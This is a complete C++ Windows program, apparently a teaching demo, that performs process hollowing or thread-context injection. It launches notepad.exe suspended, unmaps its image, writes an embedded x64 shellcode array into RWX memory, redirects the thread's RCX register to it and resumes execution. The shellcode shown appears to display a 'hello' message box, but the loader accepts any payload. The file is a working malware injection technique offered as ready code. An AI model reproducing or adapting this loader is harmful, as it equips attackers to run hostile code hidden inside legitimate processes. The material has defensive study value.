#include <windows.h>
#include <iostream>
#include <vector>
using namespace std;

int main()
{
    vector<unsigned char> shellcode = {
        0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x00, 0x00, 0x00, 0x41,
        0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60,
        0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72,
        0x50, 0x3e, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac,
        0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2,
        0xed, 0x52, 0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x6f,
        0x48, 0x01, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44, 0x8b, 0x40, 0x20, 0x49,
        0x01, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01,
        0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01,
        0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x3e, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
        0x75, 0xd6, 0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x3e, 0x41,
        0x8b, 0x0c, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x3e, 0x41, 0x8b,
        0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58,
        0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
        0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12, 0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x3e, 0x48,
        0x8d, 0x8d, 0x1a, 0x01, 0x00, 0x00, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5,
        0x49, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00, 0x3e, 0x48, 0x8d, 0x95, 0x0e, 0x01, 0x00,
        0x00, 0x3e, 0x4c, 0x8d, 0x85, 0x14, 0x01, 0x00, 0x00, 0x48, 0x31, 0xc9, 0x41, 0xba,
        0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
        0x56, 0xff, 0xd5, 0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x00, 0x68, 0x65, 0x6c, 0x6c, 0x6f,
        0x00, 0x75, 0x73, 0x65, 0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00};

    STARTUPINFOA si = {sizeof(si)}; // is a structure that contains information about process
    PROCESS_INFORMATION pi;         // is a structure that receives identification information about the newly created process and its primary thread.

    // Create a new process (notepad.exe) in a suspended state
    CreateProcessA(NULL, (LPSTR) "notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // Get the handle to ntdll.dll to use NtUnmapViewOfSection
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");

    // Get the address of NtUnmapViewOfSection function
    // This function is used to unmap a view of a section from the virtual address space of a process.
    typedef NTSTATUS(NTAPI * pNtUnmapViewOfSection)(HANDLE, PVOID);
    auto NtUnmapViewOfSection = reinterpret_cast<pNtUnmapViewOfSection>(GetProcAddress(hNtdll, "NtUnmapViewOfSection"));

    // attempts to unmap the section of memory at address 0x00400000 in the newly created process.
    // This address is typically where the executable image is loaded.
    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)0x00400000);

    // Allocate memory in the target process
    LPVOID pAddress = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Write shellcode into allocated memory
    WriteProcessMemory(pi.hProcess, pAddress, shellcode.data(), shellcode.size(), NULL);

    CONTEXT ctx;                     // CONTEXT structure to store the register state of a thread.
    ctx.ContextFlags = CONTEXT_FULL; // Sets a flag to specify that you want to retrieve or modify the full register context.

    // Retrieves the current state (register values) of the suspended thread from the process.
    GetThreadContext(pi.hThread, &ctx);

    // Set the RCX register to point to the address of the shellcode in the target process.
    ctx.Rcx = (DWORD64)pAddress;

    // This updates the suspended threadâ€™s context so that when resumed, now RCX points to the shellcode.
    SetThreadContext(pi.hThread, &ctx);

    // Resume the thread to start executing the shellcode
    ResumeThread(pi.hThread);

    // Clean up handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
